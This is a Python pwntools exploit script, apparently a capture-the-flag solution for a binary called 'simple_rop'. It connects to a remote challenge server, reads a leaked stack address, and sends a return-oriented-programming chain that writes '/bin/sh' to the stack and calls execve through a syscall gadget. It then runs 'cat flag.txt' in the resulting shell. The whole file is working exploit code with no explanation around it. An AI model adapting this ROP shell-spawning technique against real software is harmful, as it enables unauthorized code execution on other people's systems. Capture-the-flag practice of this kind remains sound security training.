from pwn import *

# Have to use p64() in address if you don't have this line
context.binary = './simple_rop'

p = remote("140.113.207.245", 30173)
# p = process('./simple_rop')

# Static Address (no PIE)
# pop_rdi_rbp = 0x0000000000402188
# pop_rsi = 0x00000000004104c2
# pop_rdx = 0x0000000000413270
# pop_rax = 0x0000000000427f2b
# syscall = 0x0000000000401324


# Same as above, but use ROP function (no PIE)
rop = ROP(ELF('./simple_rop'))
pop_rdi_rbp = rop.find_gadget(['pop rdi'])[0]    
pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]
pop_rax = rop.find_gadget(['pop rax','ret'])[0]
syscall  = rop.find_gadget(['syscall'])[0]


# Get stack address from program output
p.recvuntil(b'stack address ')
stack = int(p.readline().strip(), 16)
print("Stack address:", hex(stack))

# Write '/bin/sh\0' to stack, followed by ROP chain
bin_sh = b'/bin/sh\0'
bin_sh_addr = stack

payload = flat(
    bin_sh.ljust(24, b'\0'),
    pop_rdi_rbp, bin_sh_addr, 0,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 0x3b,
    syscall, 0
)

p.sendline(payload)

command = b'cat flag.txt\n'
for byte in command:
    p.send(bytes([byte]))
    time.sleep(0.05)

print(p.recvall(timeout=0.2).decode())
p.close()
